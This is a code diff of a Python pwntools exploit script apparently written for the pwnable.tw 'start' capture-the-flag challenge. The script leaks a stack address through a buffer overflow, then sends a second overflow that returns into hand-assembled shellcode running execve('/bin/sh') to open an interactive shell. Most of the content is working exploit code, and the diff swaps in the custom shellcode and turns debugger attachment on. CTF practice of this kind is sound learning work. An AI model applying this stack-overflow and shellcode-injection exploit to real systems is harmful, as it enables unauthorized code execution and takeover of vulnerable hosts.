@@ -9,7 +9,7 @@ debug = 1 if '-nd' not in args else 0
 
 proc_name = 'start1'
 local = 1 if '-r' not in args else 0
-attach = local & 0
+attach = local & 1 
 bps = attach & 0
 #socat TCP4-LISTEN:10001,fork EXEC:./pwn1
 ip = 'chall.pwnable.tw'
@@ -38,27 +38,31 @@ def rl():
 	return io.recvline()
 
 def pwn():
-	makeio()
-	if debug:
-		context.log_level = 'debug'
-	if attach:
-		if bps:
-			gdb.attach(pidof(proc_name)[0], open('bps'))
-		else:
-			gdb.attach(pidof(proc_name)[0])
+    makeio()
+    if debug:
+        context.log_level = 'debug'
+    if attach:
+        if bps:
+            gdb.attach(pidof(proc_name)[0], open('bps'))
+        else:
+            gdb.attach(pidof(proc_name)[0])
+    
+    ru("Let's start the CTF:")
+    payload = 'A'*0x14 + p32(0x08048087) #	mov    ecx,esp
+    sd(payload)
+    stack_addr = io.recv(4)
+    print stack_addr
+    stack_addr = u32(stack_addr)
+    print hex(stack_addr)
+    #shellcode = shellcraft.execve('/bin/sh')
 
-	ru("Let's start the CTF:")
-	payload = 'A'*0x14 + p32(0x08048087) #	mov    ecx,esp
-	sd(payload)
-	stack_addr = io.recv(4)
-	print stack_addr
-	stack_addr = u32(stack_addr)
-	print hex(stack_addr)
-	#shellcode = shellcraft.execve('/bin/sh')
+    #payload2 = 'B'*0x14 + p32(stack_addr+0x14)   + shellcode
+    rop = asm("xor eax,eax;mov eax,0xb;xor edx,edx;xor ecx,ecx;push 0x68732f;push 0x6e69622f;mov ebx,esp; int 0x80;")
+    payload2 = 'B'*0x14 + p32(stack_addr + 0x14) + rop
 
-	payload2 = 'B'*0x14 + p32(stack_addr+0x18)  +4*'\x90' + shellcode
-	sl(payload2)
-	io.interactive()
+    sl(payload2)
+	
+    io.interactive()
 
 
 if __name__ == '__main__':
